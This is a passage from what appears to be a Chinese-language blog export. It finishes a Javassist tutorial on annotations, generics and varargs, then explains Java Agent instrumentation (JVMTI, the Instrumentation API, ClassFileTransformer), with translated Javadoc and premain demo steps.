<h3 id="注解-元标签"><a href="#注解-元标签" class="headerlink" title="注解 元标签"></a>注解 元标签</h3><p>注释作为运行时不可见（或可见）的注记属性，存储在类文件中。</p>
<p>调用 getAttribute（AnnotationsAttribute.invisibleTag）方法，可以从 ClassFile，MethodInfo 或 FieldInfo 中获取注记属性。</p>
<p>更多信息，请参阅 <code>javassist.bytecode.AnnotationsAttribute</code> 和<code>javassist.bytecode.annotation</code> 包的 javadoc 手册。</p>
<p>Javassist还允许你通过更高级别的API访问注解。如果你想通过CtClass访问注解，在CtClass或CtBehavior中调用getAnnotations()。</p>
<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>Javassist 的低级别 API 完全支持 Java 5 引入的泛型。但是，高级别的API（如CtClass）不直接支持泛型。</p>
<p>Java的泛型是通过擦除技术实现的。在编译之后，所有的类型参数都会被丢掉。例如，假设你的源代码声明了一个参数化类型Vector <String>。</String></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Vector&lt;String&gt; v = <span class="keyword">new</span> Vector&lt;String&gt;();</span><br><span class="line">  :</span><br><span class="line">String s = v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>编译后的字节码等价于以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Vector v = <span class="keyword">new</span> Vector();</span><br><span class="line">  :</span><br><span class="line">String s = (String)v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>所以当你写字节码变换器时，你可以直接放弃所有类型参数。</p>
<p>由于<strong>Javassist中嵌入的编译器不支持泛型</strong>，所以如果源代码是由Javassist编译的，例如通过CtMethod.make()，<strong>必须在调用者处插入一个显式类型转换</strong>。如果源代码是由普通的Java编译器（如javac）编译的，则无需进行类型转换。</p>
<p>例如，如果你有一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wrapper</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  T value;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Wrapper</span><span class="params">(T t)</span> </span>&#123; value = t; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并想添加一个接口 Getter<T> 到类 Wrapper<T>：</T></T></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Getter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function">T <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么你真正要添加的接口其实是Getter（将类型参数<T>丢掉），最后你添加到 Wrapper 类的方法是这样的：</T></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> value; &#125;</span><br></pre></td></tr></table></figure>

<p>注意，不需要类型参数。 由于 get 返回一个 Object，如果源代码是由 Javassist 编译的，那么在调用方需要进行显式类型转换。 例如，如果类型参数 T 是 String，则必须插入（String），如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Wrapper w = ...</span><br><span class="line">String s = (String)w.get();</span><br></pre></td></tr></table></figure>

<p>如果你需要在运行时通过反射使类型参数可以访问，你必须在类文件中添加通用签名。更多的细节，请参见CtClass中setGenericSignature方法的API文档（javadoc）。</p>
<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>目前，Javassist 不直接支持可变参数。 因此，要使用 varargs 创建方法，必须<strong>显式设置方法修饰符</strong>。假设要定义下面这个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123; <span class="keyword">return</span> args.length; &#125;</span><br></pre></td></tr></table></figure>

<p>使用 Javassist 应该是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = <span class="comment">/* target class */</span>;</span><br><span class="line">CtMethod m = CtMethod.make(<span class="string">"public int length(int[] args) &#123; return args.length; &#125;"</span>, cc);</span><br><span class="line">m.setModifiers(m.getModifiers() | Modifier.VARARGS);</span><br><span class="line">cc.addMethod(m);</span><br></pre></td></tr></table></figure>

<p>参数类型<code>int ...</code>被更改为<code>int []</code>，<code>Modifier.VARARGS</code>被添加到方法修饰符中。</p>
<p>要在由 Javassist 的编译器编译的源代码中调用此方法，需要这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">length(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>而不是这样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">length(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Javassist</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Agent解读</title>
    <url>/Java-Agent%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>空山新雨后，天色晚来秋。</p>
</blockquote>
<p>整理Java Agent相关知识 。</p>
<a id="more"></a>

<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载。</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207121651182.png" alt="image-20210207121651182"></p>
<h2 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h2><p><strong>==万物起源==</strong></p>
<p>JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。</p>
<h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p>在Java SE 5之前，要实现一个Agent只能通过编写Native代码来实现。</p>
<p>从Java SE 5开始，可以使用Java的Instrumentation接口（<strong>java.lang.instrument</strong>包）来编写Agent。</p>
<p>从而 Java SE 6 的新特性改变了这种情况，通过 Java Tool API 中的 <strong>attach</strong> 方式，我们可以很方便地在运行过程中动态地设置加载代理类，以达到Instrumentation的目的。</p>
<p>并且从Java SE 6开始，可以向native method插桩。</p>
<p><strong>==无论是通过Native的方式还是通过Java Instrumentation接口的方式来编写Agent，它们的工作都是借助JVMTI来进行完成。==</strong></p>
<h1 id="Instrumentation-1"><a href="#Instrumentation-1" class="headerlink" title="Instrumentation"></a>Instrumentation</h1><p>这里把Instrumentation单独拿出来细说<code>java.lang.instrument.Instrumentation</code>.</p>
<p>Instrumentation接口设计初衷是为了收集Java程序运行时的数据，用于监控运行程序状态，记录日志，分析代码用的。</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207135925174.png" alt="image-20210207135925174"></p>
<p>目前可以实现(对应JVM方法)：</p>
<ol>
<li><p>动态添加或移除自定义的<code>ClassFileTransformer</code>（<code>addTransformer/removeTransformer</code>）</p>
<p>JVM会在类加载时调用Agent中注册的<code>ClassFileTransformer</code>；</p>
</li>
<li><p>动态修改<code>classpath</code>（<code>appendToBootstrapClassLoaderSearch</code>、<code>appendToSystemClassLoaderSearch</code>）</p>
<p>将Agent程序添加到<code>BootstrapClassLoader</code>和<code>SystemClassLoaderSearch</code>（对应的是<code>ClassLoader类的getSystemClassLoader方法</code>，默认是<code>sun.misc.Launcher$AppClassLoader</code>）中搜索；</p>
</li>
<li><p>动态获取所有<code>JVM</code>已加载的类(<code>getAllLoadedClasses</code>)；</p>
</li>
<li><p>动态获取某个类加载器已实例化的所有类(<code>getInitiatedClasses</code>)。</p>
</li>
<li><p>重定义某个已加载的类的字节码(<code>redefineClasses</code>)。</p>
</li>
<li><p>动态设置<code>JNI</code>前缀(<code>setNativeMethodPrefix</code>)，可以实现Hook native方法。</p>
</li>
<li><p>重新加载某个已经被JVM加载过的类字节码(<code>retransformClasses</code>)。</p>
</li>
</ol>
<p>两种部署模式：</p>
<p>Java Agent支持目标JVM启动时加载，也支持在目标JVM运行时加载，这两种不同的加载模式会使用不同的入口函数。</p>
<p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的。</p>
<p><code>Instrumentation</code>类方法如下：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210202230129428.png" alt="image-20210202230129428"></p>
<p>学习API最好的方法就是阅读JavaDoc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.instrument;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    该类提供了工具化Java编程语言代码所需的服务。</span><br><span class="line">    仪表化是指在方法中添加字节码，以收集数据，供工具使用。</span><br><span class="line">    由于这些变化是纯粹的加法，所以这些工具不会修改应用程序的状态或行为。</span><br><span class="line">    这种良性工具的例子包括监控代理、剖析器、覆盖率分析器和事件记录器。</span><br><span class="line">    </span><br><span class="line">    下面有两种方式来实例化Instrumentation接口：</span><br><span class="line">      <span class="number">1</span>.当JVM启动时，-javaagent：Agent.jar 指示代理类。在这种情况下，premain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">      <span class="number">2</span>.当JVM启动之后，可以Attach目标进程上。在这种情况下，agentmain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">     </span><br><span class="line">    一旦Agent获得一个Instrumentation实例，代理可以在任何时候调用实例上的方法。</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer,<span class="keyword">boolean</span> canRetransform)</span></span></span><br><span class="line"><span class="function">      注册所提供的Tranformer。从此以后所有类定义都会被Tranformer看到，但不包括任何已注册的Transformer所依赖的类的定义。</span></span><br><span class="line"><span class="function">      当类被加载时，当类被重新定义时，Tranformer被调用；</span></span><br><span class="line"><span class="function">      如果 canRetransform 为真，当类被重新转换时，变压器被调用。</span></span><br><span class="line"><span class="function">    	变换调用的顺序请参见 ClassFileTransformer.transformer。</span></span><br><span class="line"><span class="function">    	如果一个Transformer在执行过程中抛出了异常，JVM仍然会依次调用其他注册的Transformer。</span></span><br><span class="line"><span class="function">    	同一个Transformer可以被添加一次以上，但强烈不鼓励这样做，可以通过创建一个新的Transformer实例来避免这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span></span><br><span class="line"><span class="function">      解除所提供的Transformer注册。今后的类定义将不会显示给Transformer。</span></span><br><span class="line"><span class="function">      删除Transformer最近添加的匹配实例。由于类加载的多线程特性，Transformer在被删除后可能会收到调用。</span></span><br><span class="line"><span class="function">      Transformer的编写应考虑到这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新转换。</span></span><br><span class="line"><span class="function">      重构已经加载的类的能力是JVM的一个可选能力，只有当代理JAR中的Can-Retransform-Classes manifest属性被设置为<span class="keyword">true</span>时，才支持重构。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Retransform-Classes manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持此能力时，才会支持重构。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span></span><br><span class="line"><span class="function">      给Class&lt;?&gt; classes 中的若干类进行转换。</span></span><br><span class="line"><span class="function">      该方法便于对已经加载的类进行转换。</span></span><br><span class="line"><span class="function">      当类被初始加载或重新定义时，可以使用ClassFileTransformer对初始类文件字节进行转换。</span></span><br><span class="line"><span class="function">      这个函数会重新运行转换过程（无论之前是否发生过转换）。</span></span><br><span class="line"><span class="function">      重新转换遵循以下步骤：</span></span><br><span class="line"><span class="function">      1. 从初始的类文件字节开始</span></span><br><span class="line"><span class="function">      2. 对于每个添加了 canRetransform <span class="keyword">false</span> 的Transformer，由 transform 返回的字节将被重新使用，作为变换的输出，不做任何修改；</span></span><br><span class="line"><span class="function">      3. 对于每个添加了 canRetransform <span class="keyword">true</span> 的Transformer，这些Transformer都会调用 transform 方法。</span></span><br><span class="line"><span class="function">      4.转化后的类文件字节被安装为类的新定义。</span></span><br><span class="line"><span class="function">      变换的顺序在 transform 方法中描述。这个相同的顺序被用于自动重新应用无法变换的变换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      初始类文件的字节代表传递给ClassLoader.defineClass或redefineClasses的字节（在任何转换行为之前），然而它们可能不完全匹配。常量池可能没有相同的布局或内容。常量池可能有更多或更少的条目。常量池条目的顺序可能不同，但是，方法字节码中的常量池索引会对应。一些属性可能不存在。在顺序没有意义的地方，例如方法的顺序，顺序可能不会被保留。</span></span><br><span class="line"><span class="function">      该方法会在一个集合上操作（看入参的形式就是一个不定数组），以允许同时对多个类进行相互依赖的改变（类 A 的重构可能需要类 B 的重构）。</span></span><br><span class="line"><span class="function">      如果一个重构的方法有高频活动的栈帧，这些活动帧将继续运行原方法的字节码。重构后的方法将在新的调用.<span class="title">invoke</span><span class="params">()</span>中使用。</span></span><br><span class="line"><span class="function">      这个方法不会引起任何初始化.换句话说，重新定义一个类不会导致其初始化。静态变量的值将保持在调用之前的状态。</span></span><br><span class="line"><span class="function">      重构后的类的实例不会受到影响。</span></span><br><span class="line"><span class="function">      重构可以改变方法体、常量池和类属性。重构不能增加、删除或重命名字段或方法，不能改变方法的签名，也不能改变继承。这些限制也许会在未来的版本中被取消。类文件字节的检查、验证和安装直到应用了转换之后才会进行，如果结果字节有错误，这个方法将抛出一个异常。</span></span><br><span class="line"><span class="function">      如果本方法抛出异常，说明没有类被重新转换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新定义。</span></span><br><span class="line"><span class="function">      重新定义已经加载的类的能力是JVM的一个可选能力，只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义。</span></span><br><span class="line"><span class="function">      只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义（如包规范中所述），并且JVM支持该能力。在单个JVM的单次实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span> <span class="keyword">throws</span> ClassNotFoundException,</span></span><br><span class="line"><span class="function">                     UnmodifiableClassException</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      使用提供的类文件重新定义提供的类集。</span></span><br><span class="line"><span class="function">      这个方法用于替换类的定义，而不引用现有的类文件字节。</span></span><br><span class="line"><span class="function">      就像从源码重新编译以进行修复和继续调试时一样。当现有的类文件字节要被转换时（例如在字节码instrumentation中），应该使用retransformClasses。</span></span><br><span class="line"><span class="function">      这个方法在一个集合上操作，以便允许同时对多个类进行相互依赖的改变（对类A的重新定义可能需要对类B的重新定义）。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span></span><br><span class="line"><span class="function">      确定一个类是否可以通过retransformClasses或redefineClasses进行修改。如果一个类是可修改的，那么本方法返回<span class="keyword">true</span>。如果一个类是不可修改的，那么这个方法返回<span class="keyword">false</span>。</span></span><br><span class="line"><span class="function">      要想对一个类进行重构，<span class="title">isRetransformClassesSupported</span><span class="params">()</span>也必须为真。但是is的值不会影响这个函数返回的值。要想重新定义一个类，<span class="title">isRedefineClassesSupported</span><span class="params">()</span>也必须为真，但<span class="title">isRedefineClassesSupported</span><span class="params">()</span>的值不会影响这个函数返回的值。</span></span><br><span class="line"><span class="function">      基元类（例如java.lang.Integer.TYPE）和数组类是永远不能修改的。                 </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Class[] <span class="title">getAllLoadedClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回JVM当前加载的所有类的数组。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">Class[] <span class="title">getInitiatedClasses</span><span class="params">(ClassLoader loader)</span></span></span><br><span class="line"><span class="function">      返回一个数组，该数组包含了所有由loader加载的类。如果提供的Loader为空，则返回由bootstrap类Loader加载的类。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span></span><br><span class="line"><span class="function">			返回指定对象消耗的存储量的近似值。这个结果可能包括对象的部分或全部开销，因此对于在单独一个实现内进行比较是有用的，但对于实现之间的比较是没有用的。在JVM的单次调用中，估计值可能会改变。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由Bootstrap加载器加载。</span></span><br><span class="line"><span class="function">      当虚拟机内置的类加载器（称为 "bootstrap class loader"）搜索某个类不成功时，JAR文件中的条目也会被搜索。</span></span><br><span class="line"><span class="function">			本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function">      Agent应该注意确保JAR文件中除了那些将由引导类加载器定义的类或资源，不包含任何其他类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为。例如，假设有一个加载器L，L的用于授权的父类是bootstrap类加载器。此外，L定义的类C中的一个方法引用了一个非公共的访问者类C$1，如果JAR文件中包含一个类C$1，那么授权给bootstrap类加载器将导致C$1被bootstrap类加载器定义。在这个例子中，一个IllegalAccessError将被抛出，可能会导致应用程序失败。避免这类问题的一个方法是为插桩类使用一个独特的包名。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由SystemClassLoader。</span></span><br><span class="line"><span class="function">      这里面的SystemClassLoader其实就是ApplicationClassLoader。</span></span><br><span class="line"><span class="function">      当委托的系统类加载器（参见<span class="title">getSystemClassLoader</span><span class="params">()</span>）搜索一个类不成功时，JarFile中的条目将被搜索。</span></span><br><span class="line"><span class="function">本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">			Agent应注意确保JAR中不包含除SystemClassLoader以外的任何类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为（参见appendToBootstrapClassLoaderSearch）。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">			如果SystemClassLoader实现了一个名为appendToClassPathForInstrumentation的方法，那么它就支持添加一个要搜索的JAR文件，该方法接收一个类型为java.lang.String的单一参数。该方法不需要公开访问。JAR文件的名称是通过调用jarfile上的<span class="title">getName</span><span class="params">()</span>方法获得的，并作为参数提供给appendToClassPathForInstrumentation方法。</span></span><br><span class="line"><span class="function">			此方法不会改变java.class.path系统属性的值。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持设置本地方法前缀。设置本地方法前缀的能力是JVM的一个可选能力。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Set-Native-Method-Prefix manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持该能力时，才会支持设置本地方法前缀。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer,String prefix)</span></span></span><br><span class="line"><span class="function">      设置<span class="keyword">native</span> method 前缀</span></span><br></pre></td></tr></table></figure>



<h1 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h1><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p>
<p>可以使用<code>addTransformer</code>注册一个我们自定义的<code>Transformer</code>到<code>Java Agent</code>，当有新的类被<code>JVM</code>加载时<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，==可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后将新的类字节码返回给<code>JVM</code>==，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p>
<p>继续读JavaDoc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">通常，一个Agent提供了这个接口的实现，以便转换类文件。转换发生在JVM定义类之前。</span><br><span class="line">请注意，类文件这个术语在Java™虚拟机规范第<span class="number">3.1</span>节中定义，指的是类文件格式的字节序列，无论它们是否驻留在文件中。</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">byte</span>[] transform(ClassLoader loader,</span><br><span class="line">                 String className,</span><br><span class="line">                 Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                 ProtectionDomain protectionDomain,</span><br><span class="line">                 <span class="keyword">byte</span>[] classfileBuffer)</span><br><span class="line">          <span class="keyword">throws</span> IllegalClassFormatException</span><br><span class="line"></span><br><span class="line">	该方法的实现可以对提供的类文件进行转换，并返回一个新的替换类文件。</span><br><span class="line">  一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。能够重构的变换器也会在每次类重构时被调用。</span><br><span class="line">  新类定义的请求是通过ClassLoader.defineClass或其原生等价物来实现的。</span><br><span class="line">  对类的redefinition的请求是通过Instrumentation.redefineClasses或它的本机等价物提出的。</span><br><span class="line">  类的retransformation请求由 Instrumentation.retransformClasses 或其本机等价物发出。</span><br><span class="line">  在请求的处理过程中，在类文件字节被验证或应用之前，Transformer被调用。</span><br><span class="line">  当有多个Transformer时，Transformer是通过链式变换调用组成的。也就是说，一次变换调用返回的字节数组成为下一次调用的输入（通过classfileBuffer参数）。</span><br><span class="line">  </span><br><span class="line">  对于retransformation，不能重构的变换器不被调用，而是重用之前变换的结果。在所有其他情况下，这个方法都会被调用。在这些分组中，transformers按照注册的顺序被调用。原生变换器由Java虚拟机工具接口中的ClassFileLoadHook事件提供。</span><br><span class="line">  参数：</span><br><span class="line">  loader              定义要转换的类加载器；如果是引导加载器，则为 <span class="keyword">null</span></span><br><span class="line">	className           类名,如:java/lang/Runtime</span><br><span class="line">  classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 <span class="keyword">null</span></span><br><span class="line">  protectionDomain    要定义或重定义的类的保护域</span><br><span class="line">  classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> 字节码<span class="keyword">byte</span>数组</span><br></pre></td></tr></table></figure>



<p><strong>重写<code>transform</code>方法需要注意以下事项：</strong></p>
<ol>
<li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li>
<li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li>
<li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
<li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li>
<li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li>
<li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。一定要增加true参数！！！</li>
<li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li>
</ol>
<p>Java Agent还限制了我们：</p>
<ol>
<li>必须以jar包的形式运行或加载；</li>
<li>必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（启动前Agent模式）或<code>Agent-Class:</code>（运行中Agent模式）配置；</li>
<li>如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</li>
</ol>
<h1 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h1><p>接下来进行实验，启动前<code>premain+-javaagent</code>以及启动中<code>Attach</code> 两种模式。</p>
<h2 id="启动前指定Agent位置"><a href="#启动前指定Agent位置" class="headerlink" title="启动前指定Agent位置"></a>启动前指定Agent位置</h2><p>如果需要在目标JVM启动的同时加载Agent，实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure>

<p>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。</p>
<h3 id="实战一：premain方法测试"><a href="#实战一：premain方法测试" class="headerlink" title="实战一：premain方法测试"></a>实战一：premain方法测试</h3><p>写一个demo做个实验：</p>
<p>创建Agent类，声明premain方法：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201222948010.png" alt="image-20210201222948010"></p>
<p>使用maven-jar-plugin，创建MANIFEST.MF：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223255740.png" alt="image-20210201223255740"></p>
<p>MANIFEST.MF：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223426121.png" alt="image-20210201223426121"></p>
<p><code>mvn clean install</code>生成jar包：<code>java_agent_01-1.0-SNAPSHOT</code></p>
<p>待插桩类：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223908739.png" alt="image-20210201223908739"></p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223920391.png" alt="image-20210201223920391"></p>
<p>同样打包，<code>example01-1.0-SNAPSHOT</code>：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223953455.png" alt="image-20210201223953455"></p>
<p>终端执行，成功插桩：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201224546368.png" alt="image-20210201224546368"></p>
<h3 id="实战二：打印加载的类"><a href="#实战二：打印加载的类" class="headerlink" title="实战二：打印加载的类"></a>实战二：打印加载的类</h3><p>之前也提到，一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。</p>
<p>一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。</p>
<p>首先addTranformer：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209211836621.png" alt="image-20210209211836621"></p>
<p>这里ClassFileTransformerDemo()继承了ClassFileTransformer类，记得最后加上ture：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212017484.png" alt="image-20210209212017484"></p>
<p>这里就是简单的执行了打印在Tranformer之后加载的类：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212111604.png" alt="image-20210209212111604"></p>
